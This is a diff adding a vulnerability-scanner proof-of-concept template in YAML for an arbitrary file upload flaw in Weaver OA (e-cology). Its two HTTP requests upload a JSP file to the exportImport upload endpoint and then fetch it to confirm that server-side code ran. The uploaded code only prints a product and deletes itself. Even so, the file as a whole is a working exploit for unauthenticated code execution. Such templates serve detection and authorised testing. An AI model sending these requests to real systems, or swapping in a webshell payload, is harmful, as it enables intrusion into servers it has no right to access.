@@ -1,0 +1,42 @@
+id: poc-yaml-weaver-oa-uploadoperation-arbitrary-file-upload
+info:
+  name: Weaver OA 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: e-cology
+  reference: []
+  description: null
+variables:
+  r1: random_str(4)
+  r2: random_int(40000, 44800)
+  r3: random_int(40000, 44800)
+transport: http
+requests:
+- method: POST
+  path: /page/exportImport/uploadOperation.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+  data: '------WebKitFormBoundaryFy3iNVBftjP6IOwo
+
+    Content-Disposition: form-data; name="file"; filename="{{.r1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+    <%out.print({{.r2}} * {{.r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /page/exportImport/fileTransfer/{{.r1}}.jsp
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r2 * r3)
+  output: []
